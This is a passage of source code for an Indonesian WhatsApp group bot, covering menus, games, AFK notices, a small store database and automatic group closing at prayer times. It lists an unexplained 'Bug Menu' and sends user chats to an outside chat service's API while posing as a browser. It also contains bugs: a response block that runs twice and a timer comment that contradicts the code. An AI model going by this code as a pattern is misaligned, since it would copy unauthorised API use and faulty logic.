                      },
                      {
                      title: "Store Menu🛍️",
                      description: "© "+namaBot,
                      id: ".menustore"
                      },
                      {
                      title: "Quotes Menu💪",
                      description: "© "+namaBot,
                      id: ".menuquotes"
                      },
                      {
                      title: "Menfess Menu💌",
                      description: "© "+namaBot,
                      id: ".menumenfess"
                      },
                      {
                      title: "Random Menu🔀",
                      description: "© "+namaBot,
                      id: ".menurandom"
                      },
                      {
                      title: "Berita Menu🌐",
                      description: "© "+namaBot,
                      id: ".menuberita"
                      },
                      {
                      title: "Linode Menu🌥️",
                      description: "© "+namaBot,
                      id: ".menulinode"
                      },
                      {
                      title: "Nfsw Menu🔞",
                      description: "© "+namaBot,
                      id: ".menunsfw"
                      },
                      {
                      title: "Genshin Menu🈺",
                      description: "© "+namaBot,
                      id: ".menugenshin"
                      },
                      {
                      title: "Premium Menu💎",
                      description: "© "+namaBot,
                      id: ".menupremium"
                      },
                      {
                      title: "Encrypted Menu🔒",
                      description: "© "+namaBot,
                      id: ".menuenc"
                      },
                      {
                      title: "Digital Ocean Menu🌤️",
                      description: "© "+namaBot,
                      id: ".menudigitalocean"
                      },
                      {
                      title: "Islam Menu🕌",
                      description: "© "+namaBot,
                      id: ".menuislam"
                      },
                      {
                      title: "Search Menu🔍",
                      description: "© "+namaBot,
                      id: ".menusearch"
                      },
                      {
                      title: "Bug Menu☠️",
                      description: "© "+namaBot,
                      id: ".menubug"
                      },
                      {
                      title: "Stalk Menu🧐",
                      description: "© "+namaBot,
                      id: ".menustalk"
                      },
                      {
                      title: "Install Menu⬇️",
                      description: "© "+namaBot,
                      id: ".menustalk"
                      }
                      ]
                      },
                      {
                      title: "Script Informasi",
                      rows: [
                      {
                      title: "Script Lyrra-MultiDevice📁",
                      description: "Script Info",
                      id: ".sc"
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  footer: name,
  headerType: 1,
  viewOnce: true,
image: { url: thumbnail },
caption: lyrramenu,
contextInfo:{
mentionedJid:[sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `© Hai ${pushname}`,
serverId: 200
}, 
externalAdReply: {
title: name,
body: `version • ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime • ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
}, {quoted: null })
}
  
const menuV2 = (teks) => {
let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
					let exp = db.users[m.sender].exp;
      let requireexp = 2400;
      const maxRequireExp = 77777777777;
      while (exp >= requireexp && requireexp < maxRequireExp) {
        requireexp += 2400;
        if (requireexp > maxRequireExp) {
          requireexp = maxRequireExp;
        }
      }
      const limits = checkLimit(sender)
      const caseDir = './Marin';
  const pluginDir = './Plugins';

  // Hitung jumlah file di folder case
  let totalCase = totalfitur;
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length;
  }

  // Hitung jumlah file di folder plugins
  let totalPlugin = 0;
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length;
  }

  // Total fitur gabungan
  let totalFitur = totalCase + totalPlugin
					const lyrramenu = `
━━━━━━━━━━━━━━━━━━━━
 🤖  ɪɴꜰᴏ   ʙᴏᴛ
━━━━━━━━━━━━━━━━━━━━
📛 ɴᴀᴍᴀ ʙᴏᴛ      : ᴍᴀʀɪɴ ᴋɪᴛᴀɢᴀᴡᴀ
⚙️ ᴠᴇʀꜱɪ         : ᴠ1.0.0 ꜱᴛᴀʙʟᴇ
⏳ ᴜᴘᴛɪᴍᴇ        : ᴏɴʟɪɴᴇ 24 ᴊᴀᴍ
🔗 ᴊᴇɴɪꜱ ʙᴀɪʟᴇʏꜱ : ʟɪʟʏs-ʙᴀɪʟᴇʏs

✨ ᴋᴇᴜɴɢɢᴜʟᴀɴ :
➤ ʀᴇꜱᴘᴏɴ ᴄᴇᴘᴀᴛ ᴅᴀɴ ꜱᴛᴀʙɪʟ
➤ ꜱᴜᴘᴘᴏʀᴛ ʙᴇʀʙᴀɢᴀɪ ꜰɪᴛᴜʀ ᴏᴛᴏᴍᴀᴛɪꜱ
➤ ᴀᴍᴀɴ, ʀɪɴɢᴀɴ, ᴅᴀɴ ᴊᴀʀᴀɴɢ ᴇʀʀᴏʀ
➤ ᴍᴜᴅᴀʜ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ꜱᴇᴍᴜᴀ ᴜꜱᴇʀ

━━━━━━━━━━━━━━━━━━━━
 📂 ʟɪꜱᴛ   ᴍᴇɴᴜ
━━━━━━━━━━━━━━━━━━━━
${teks}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 ᴄʀᴇᴀᴛᴏʀ : ꜰᴀʟʟᴢx ɪɴꜰɪɴɪᴛʏ  
📅 ᴅɪʙᴜᴀᴛ    : 2 ᴊᴀɴᴜᴀʀɪ 2026
━━━━━━━━━━━━━━━━━━━━`
sock.sendMessage(m.chat, {
video: { url: video },
    gifPlayback: true,
    caption: lyrramenu,
contextInfo:{
mentionedJid:[sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `© Hai ${pushname}`,
serverId: 200
}, 
externalAdReply: {
title: name,
body: `version • ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: linkgc,
mediaType: 1,
renderLargerThumbnail: true,
}}
}, {quoted: null })
}

const menuV3 = (teks) => {
let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
					let exp = db.users[m.sender].exp;
      let requireexp = 2400;
      const maxRequireExp = 77777777777;
      while (exp >= requireexp && requireexp < maxRequireExp) {
        requireexp += 2400;
        if (requireexp > maxRequireExp) {
          requireexp = maxRequireExp;
        }
      }
      const limits = checkLimit(sender)
      const caseDir = './Marin';
  const pluginDir = './Plugins';

  // Hitung jumlah file di folder case
  let totalCase = totalfitur;
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length;
  }

  // Hitung jumlah file di folder plugins
  let totalPlugin = 0;
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length;
  }

  // Total fitur gabungan
  let totalFitur = totalCase + totalPlugin
					const lyrramenu = `
━━━━━━━━━━━━━━━━━━━━
 🤖  ɪɴꜰᴏ   ʙᴏᴛ
━━━━━━━━━━━━━━━━━━━━
📛 ɴᴀᴍᴀ ʙᴏᴛ      : ᴍᴀʀɪɴ ᴋɪᴛᴀɢᴀᴡᴀ
⚙️ ᴠᴇʀꜱɪ         : ᴠ1.0.0 ꜱᴛᴀʙʟᴇ
⏳ ᴜᴘᴛɪᴍᴇ        : ᴏɴʟɪɴᴇ 24 ᴊᴀᴍ
🔗 ᴊᴇɴɪꜱ ʙᴀɪʟᴇʏꜱ : ʟɪʟʏs-ʙᴀɪʟᴇʏs

✨ ᴋᴇᴜɴɢɢᴜʟᴀɴ :
➤ ʀᴇꜱᴘᴏɴ ᴄᴇᴘᴀᴛ ᴅᴀɴ ꜱᴛᴀʙɪʟ
➤ ꜱᴜᴘᴘᴏʀᴛ ʙᴇʀʙᴀɢᴀɪ ꜰɪᴛᴜʀ ᴏᴛᴏᴍᴀᴛɪꜱ
➤ ᴀᴍᴀɴ, ʀɪɴɢᴀɴ, ᴅᴀɴ ᴊᴀʀᴀɴɢ ᴇʀʀᴏʀ
➤ ᴍᴜᴅᴀʜ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ꜱᴇᴍᴜᴀ ᴜꜱᴇʀ

━━━━━━━━━━━━━━━━━━━━
 📂 ʟɪꜱᴛ   ᴍᴇɴᴜ
━━━━━━━━━━━━━━━━━━━━
${teks}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 ᴄʀᴇᴀᴛᴏʀ : ꜰᴀʟʟᴢx ɪɴꜰɪɴɪᴛʏ  
📅 ᴅɪʙᴜᴀᴛ    : 2 ᴊᴀɴᴜᴀʀɪ 2026
━━━━━━━━━━━━━━━━━━━━`
sock.sendMessage(m.chat, {text: lyrramenu, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: name, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
}, {quoted: null })
}
//
const reply = (teks) => {
m.reply(teks)
}
// Function
if (!isOwner && db.chats[m.chat].onlyadmin && !isAdmins && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            
            if (!isOwner && setting.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            
            if (!isOwner && setting.onlypm && !isPrivate && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            if (setting.autotyping) {
if (command) { sock.readMessages([m.key])}
sock.sendPresenceUpdate('composing', from)
}
if (setting.autoread) {
sock.readMessages([m.key])
        };
        if (setting.autobio) {
			sock.updateProfileStatus(`${namaBot} Telah Berjalan Selama ${runtime(process.uptime())}`).catch(_ => _);
		}
		async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./Marin.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./Marin.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
async function loading(text) {
      var nln = [
        `Mohon Menunggu [10%]%`,
        `Mohon Menunggu [20%]%`,
        `Mohon Menunggu [30%]%`,
        `Mohon Menunggu [40%]`,
        `Mohon Menunggu [50%]`,
        `Mohon Menunggu [60%]`,
        `Mohon Menunggu [70%]`,
        `Mohon Menunggu [80%]`,
        `Mohon Menunggu [90%]`,
        `Mohon Menunggu [100%]`,
        `${text}`,
      ]
      let {
        key
      } = await sock.sendMessage(from, {
        text: 'Mohon Menunggu'
      }, {
        quoted: fakeQuoted
      })
      
      for (let i = 0; i < nln.length; i++) {
        await sleep(100)
        await sock.sendMessage(from, {
          text: nln[i],
          edit: key
        }, {
          quoted: fakeQuoted
        });
      }
    }
    async function loadingai(text) {
      var nln = [
        `[  ]`,
        `[ Respon Ai ]`,
        `[ Respon Ai ]\n\n${text}`,
      ]
      let {
        key
      } = await sock.sendMessage(from, {
        text: ' '
      }, {
        quoted: fakeQuoted
      })
      
      for (let i = 0; i < nln.length; i++) {
        await sleep(100)
        await sock.sendMessage(from, {
          text: nln[i],
          edit: key
        }, {
          quoted: fakeQuoted
        });
      }
    }
async function React() {
      sock.sendMessage(from, {
        react: {
          text: "🕑",
          key: m.key
        }
      })
    }
    //
    if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let durasi = ms(getTimee)

            if (!isOwner) {
                sock.sendMessage(m.chat, {text:`Woeee @${ment.split('@')[0]} balek woee, lu di cariin ${pushname} senpai`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  
            } else {
                reply(`Jangan tag dia, dia lagi ${getReason2} sejak ${durasi} yg lalu`)
            }
        }
    }

    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let durasi = ms(getTime)

        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('./lib/database/user.json', JSON.stringify(_afk))

        sock.sendTextWithMentions(
            m.chat,
            `@${m.sender.split('@')[0]} telah kembali dari afk\nReason: ${getReason}\nDurasi: ${durasi}`,
            m
        )
    }
}
async function Lyrra(promptName, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text,
                "role": "user"
            }
        ],
        "prompt": `
✨ Gue Marin AI, sistem auto-intelligent assistant. ✨

TUGASKU:
- Pahami maksud user.
- Jawab cepat, rapi, tanpa ribet.
- Bisa coding, rewrite, analisa, dan lainnya.
- Selalu jawab santai tapi jelas.

Jika user minta info, jelasin.
Jika user minta ngerap, bikin.
Jika user minta coding, generate.

Gaya bicara: casual profesional, friendly, gak kaku.

Selalu jawab langsung inti.`, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0"
        }
    });

    return response.data;
}


// DETEKSI INTENT
function detectIntent(text) {
    text = text.toLowerCase();

    // cari lagu
    if (
        text.includes("cariin lagu") || 
        text.includes("carikan lagu") || 
        text.includes("lagu") && text.includes("cari") ||
        text.includes("tolong putar") ||
        text.includes("play lagu")
    ) {
        let judul = text
            .replace(/cari(in)? lagu|carikan lagu|tolong putar|play lagu/gi, "")
            .trim();

        return { intent: "music", query: judul };
    }

    // cari foto / gambar
    if (
        text.includes("cariin foto") ||
        text.includes("carikan foto") ||
        text.includes("foto") && text.includes("cari") ||
        text.includes("gambar") && text.includes("cari") ||
        text.includes("cari gambar") ||
        text.includes("carikan gambar")
    ) {
        let query = text
            .replace(/cari(in)? foto|carikan foto|cari(in)? gambar|carikan gambar/gi, "")
            .trim();

        return { intent: "image", query };
    }

    return { intent: "normal" };
}


// MAIN EXECUTOR
if (db.chats[m.chat].autoaigc && !m.key.fromMe && !isCmd) {
    try {
        let intent = detectIntent(text);

        switch (intent.intent) {

            // 🎵 AUTO LAGU
            case "music":
                if (!intent.query) return reply("Judul lagunya apa?");
                return sock.sendMessage(m.chat, { text: `.play ${intent.query}` });

            // 🖼️ AUTO FOTO / GAMBAR
            case "image":
                if (!intent.query) return reply("Foto apa yang mau dicari?");
                return sock.sendMessage(m.chat, { text: `.pin ${intent.query}` });

            // 💬 NORMAL → AI mode
            default:
                const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
                if (data?.result) {
                    return loadai(`${data.result}`);
                } else {
                    let ai = await Lyrra(pushname, text);
                    return m.reply(ai);
                }
        }

    } catch (err) {
        console.log(err);
        reply("Terjadi error, coba lagi nanti.");
    }
}

global.autoshalat = true
sock.enhancer = sock.enhancer ? sock.enhancer : {};
        
// Prevent multiple triggers
sock.autoshalat = sock.autoshalat || {};
let id = m.chat;
if (id in sock.autoshalat) return;

// Jadwal sholat
let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
}

// Waktu WIB
const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const timeNow = datek.toTimeString().slice(0,5);

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {

    if (timeNow === waktu) {

        sock.autoshalat[id] = true;

        // 🔊 Notifikasi adzan
        await sock.sendMessage(m.chat, {
            audio: { url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ" },
            mimetype: 'audio/mpeg'
        });

        // 📝 Dapatkan semua grup → jadikan array
        let groupsObj = await sock.groupFetchAllParticipating();
        let groupList = Object.keys(groupsObj); // array fix

        // 🔒 Tutup semua grup satu per satu
        for (let jid of groupList) {
            try {
                await sock.groupSettingUpdate(jid, "announcement");
                await sock.sendMessage(jid, { text: `🔔 *Waktu sholat ${sholat}*\nGrup ditutup 5 menit.` });
            } catch (e) {
                console.log("❌ Gagal menutup grup:", jid, e);
            }
            await new Promise(res => setTimeout(res, 500)); // important
        }

        // ⏳ Buka lagi setelah 10 menit
        setTimeout(async () => {

            for (let jid of groupList) {
                try {
                    await sock.groupSettingUpdate(jid, "not_announcement");
                    await sock.sendMessage(jid, { text: `✅ Grup dibuka kembali setelah sholat ${sholat}.` });
                } catch (e) {
                    console.log("❌ Gagal membuka grup:", jid, e);
                }
                await new Promise(res => setTimeout(res, 600)); // prevent rate limit
            }

            delete sock.autoshalat[id];

        }, 5 * 60 * 1000); // 10 menit
    }
}
    function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
try {
if (!body || typeof body !== "string") return; // cegah error kalau body undefined

// GAME TEBAK KATA
if (global.tebakkata && global.tebakkata.soal) {
    let { soal, jawaban, waktu } = global.tebakkata
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkata
    }
}

// GAME ASAH OTAK
if (global.asahotak && global.asahotak.soal) {
    let { soal, jawaban, waktu } = global.asahotak
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.asahotak
    }
}

// GAME SUSUN KATA
if (global.susunkata && global.susunkata.soal) {
    let { soal, jawaban, waktu } = global.susunkata
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.susunkata
    }
}

// GAME TEBAK GAMBAR
if (global.tebakgambar && global.tebakgambar.soal) {
    let { soal, jawaban, waktu } = global.tebakgambar
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakgambar
    }
}

// GAME TEBAK BENDERA
if (global.tebakbendera && global.tebakbendera.soal) {
    let { soal, jawaban, waktu } = global.tebakbendera
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakbendera
    }
}

// GAME TEBAK KIMIA
if (global.tebakkimia && global.tebakkimia.soal) {
    let { soal, jawaban, waktu } = global.tebakkimia
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkimia
    }
}

// GAME FAMILY 100
if (global.family && global.family.soal) {
    let { soal, jawaban, waktu } = global.family
    for (let i of jawaban) {
        if (body.toLowerCase().includes(i)) {
            let anu = jawaban.indexOf(i)
            jawaban.splice(anu, 1)
            await reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\n*kamu mendapatkan 20 limit*`)
        }
    }
    if (jawaban.length < 1) {
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.family
    }
}

} catch (err) {
    console.error("Error Game:", err.message)
}

      //
      let list = []
    for (let i of owner) {
      list.push({
        displayName: await sock.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await sock.getName(i + '@s.whatsapp.net')}\n
FN:${await sock.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:${namaBot}@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://${namaBot}.com
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
      })
    }
    //
    function pickRandom(list) {
	return list[Math.floor(list.length * Math.random())]
}
const vircion = pickRandom(vircsetz)
//
const handleData = { sock, text, args, isCmd, mime, qmsg, isOwner, cmd, command, reply, React, fetchJson, mime, quoted, isGroup, isOwner, participants, isAdmins }
if (isCmd) {
await loadPluginsCommand(m, command, handleData)
}
//
const badwords = JSON.parse(fs.readFileSync('./lib/database/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./lib/database/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./lib/database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./lib/database/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./lib/database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
let db_respon_list = JSON.parse(fs.readFileSync('./lib/database/list-message.json'))
//
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
    // ✅ Proteksi anti-duplikasi global
    global.lastRespon = global.lastRespon || {};
    const lastKey = `${m.chat}-${body.toLowerCase()}`;
    if (global.lastRespon[lastKey] && Date.now() - global.lastRespon[lastKey] < 2000) return;
    global.lastRespon[lastKey] = Date.now();

    var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list);
    if (get_data_respon.isImage === false) {
        sock.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, { quoted: fakeQuoted });
    } else {
        sock.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, { quoted: fakeQuoted });
    }
}
//
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
sock.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: fakeQuoted
})} else {
sock.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {quoted: fakeQuoted})
}}
//

//

function randomNomor(min, max = null) {
    if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    } else {
        return Math.floor(Math.random() * min) + 1;
    }
}
//
function monospace(string) {
    return '*`' + string + '`*';
}
//
global.menfess = global.menfess ? global.menfess : {}
         let mf = Object.values(global.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
          //  if (!/conversation|extended/.test(m.type)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await sock.sendMessage(mf.from, { text: text }).then(async () => {
               m.reply(`pesan Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.menfess[mf.id]
               return !0
            })
         }     
//
function loadSetMenu() {
    try {
        const setmenuPath = path.join(__dirname, './lib/database/setmenu.json');
        if (!fs.existsSync(setmenuPath)) {
            const defaultData = { menuVersion: 'v1' };
            fs.writeFileSync(setmenuPath, JSON.stringify(defaultData, null, 2));
            return defaultData;
        }
        return JSON.parse(fs.readFileSync(setmenuPath));
    } catch (error) {
        console.error('Error loading setmenu:', error);
        return { menuVersion: 'v1' };
    }
}
//
function handleFeatureToggle(feature, command) {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isOwner) return m.reply(mess.admin);
    if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');

    if (args[0] === 'on') {
        db.chats[from][feature] = true;
        return reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.chats[from][feature] = false;
        return reply(`${command} is disabled`);
    }
}
//
function toRupiah(angka) {
    var saldo = '';
    var angkarev = angka.toString().split('').reverse().join('');
    for (var i = 0; i < angkarev.length; i++)
        if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
    return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
//
const tujuanA = path.join(__dirname, 'lib', 'database', 'products.json');
const tujuanB = path.join(__dirname, 'lib', 'database', 'historyt.json');
const tujuanC = path.join(__dirname, 'lib', 'database', 'discounts.json');

function getDisczz() {
    if (!fs.existsSync(tujuanC)) {
        fs.writeFileSync(tujuanC, '[]', 'utf-8');
    }
    const discountData = fs.readFileSync(tujuanC, 'utf-8');
    return JSON.parse(discountData);
}

function addDisczz(productName, discountPrice, expirationDate) {
    const discounts = getDisczz();
    const newDiscount = {
        produk: productName,
        harga_diskon: discountPrice,
        kadaluarsa: expirationDate
    };
    discounts.push(newDiscount);
    simpenDisc(discounts);
}

function getprodukDariFile() {
    if (!fs.existsSync(tujuanA)) {
        fs.writeFileSync(tujuanA, '[]', 'utf-8');
    }
    const productData = fs.readFileSync(tujuanA, 'utf-8');
    return JSON.parse(productData);
}

function simpenProduknya(products) {
    fs.writeFileSync(tujuanA, JSON.stringify(products, null, 2), 'utf-8');
}

function getidProduk(products) {
    if (products.length === 0) {
        return 1;
    }
    const lastProduct = products[products.length - 1];
    return lastProduct.produk + 1;
}

function cekProduknye(productName) {
    const products = getprodukDariFile();
    return products.some(product => product.nama.toLowerCase() === productName.toLowerCase());
}

function addprodukzz(name, price, stock) {
    const products = getprodukDariFile();
    const newProduct = {
        produk: getidProduk(products),
        nama: name,
        harga: price,
        stok: stock
    };
    products.push(newProduct);
    simpenProduknya(products);
}

function delprodukzz(productName) {
    let products = getprodukDariFile();
    products = products.filter(product => product.nama.toLowerCase() !== productName.toLowerCase());
    simpenProduknya(products);
}

function updprodukzz(name, price, stock) {
    let products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());
    if (productIndex !== -1) {
        products[productIndex].harga = price;
        products[productIndex].stok = stock;
        simpenProduknya(products);
    }
}

function getprodukdb() {
    return getprodukDariFile();
}

function simpenSmTr(transactions) {
    fs.writeFileSync(tujuanB, JSON.stringify(transactions, null, 2), 'utf-8');
}

function getSmTr() {
    if (!fs.existsSync(tujuanB)) return [];
    return JSON.parse(fs.readFileSync(tujuanB));
}

function getTrId(id) {
    const transactions = getSmTr();
    return transactions.find(t => t.id.trim() === id.trim());
}

function cIdTrnya() {
    const transactions = getSmTr();
    return `TRANS${transactions.length + 1}`;
}

function saveTrnye(transaction) {
    const transactions = getSmTr();
    transactions.push(transaction);
    simpenSmTr(transactions);
}

function simpenDisc(discounts) {
    fs.writeFileSync(tujuanC, JSON.stringify(discounts, null, 2), 'utf-8');
}


function persenDiskonnya(originalPrice, discountPrice) {
    return Math.round(((originalPrice - discountPrice) / originalPrice) * 100);
}

function ngerestokk(name, quantity) {
    const products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());

    if (productIndex !== -1) {
        products[productIndex].stok += quantity;
        simpenProduknya(products);
        return products[productIndex];
    } else {
        return null
    }
}
//
async function ranke(idnya) {
      const rrole = db.users[idnya].level;

      const ranks = [{
          name: 'Bronze',
          maxLevel: 3
        },
        {
          name: 'Silver',
          maxLevel: 60
        },
        {
          name: 'Gold',
          maxLevel: 90
        },
        {
          name: 'Diamond',
          maxLevel: 120
        },
        {
          name: 'Master',
          maxLevel: 150
        },
        {
          name: 'Grandmaster',
          maxLevel: 180
        },
        {
          name: 'Champion',
          maxLevel: 2100
        },
        {
          name: 'Legend',
          maxLevel: 2400
        },
        {
          name: 'Immortal',
          maxLevel: 2700
        },
        {
          name: 'Supreme',
          maxLevel: 3000
        },
        {
          name: 'Elite',
          maxLevel: 3300
        },
        {
          name: 'Hero',
          maxLevel: 36000
        },
        {
          name: 'Veteran',
          maxLevel: 39000
        },
        {
          name: 'Expert',
          maxLevel: 42000
        },
        {
          name: 'Adept',
          maxLevel: 45000
        },
        {
          name: 'Novice',
          maxLevel: 48000
        },
        {
          name: 'Rookie',
          maxLevel: 51000
        },
        {
          name: 'Beginner',
          maxLevel: 540000
        },
        {
          name: 'Apprentice',
          maxLevel: 570000
        },
        {
          name: 'Warrior',
          maxLevel: 600000
        },
        {
          name: 'Knight',
          maxLevel: 630000
        },
        {
          name: 'Paladin',
          maxLevel: 660000
        },
        {
          name: 'Mage',
          maxLevel: 690000
        },
        {
          name: 'Wizard',
